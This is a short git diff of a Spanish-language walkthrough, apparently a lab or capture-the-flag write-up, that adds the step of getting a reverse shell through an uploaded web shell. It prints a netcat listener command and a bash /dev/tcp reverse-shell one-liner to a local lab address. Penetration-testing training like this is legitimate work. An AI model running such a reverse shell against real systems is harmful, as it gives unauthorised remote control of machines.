@@ -67,8 +67,11 @@ Una vez subido el archivo, veremos que se verá reflejado en el **Directory List
 
 Entraremos al archivo y veremos que tenemos un input para poder colocar comandos. por lo que ahora, escuchando en una terminal con ```nc -lvnp 443``` ejecutaremos la reverse shell de la siguiente manera:
 ```
-
+bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'
 ```
+<img width="641" height="193" alt="image" src="https://github.com/user-attachments/assets/21660bd6-d48b-4a95-a2e5-b4e6862e2512" />
+
+Y finalmente tendremos acceso a la máquina.
 
 
 
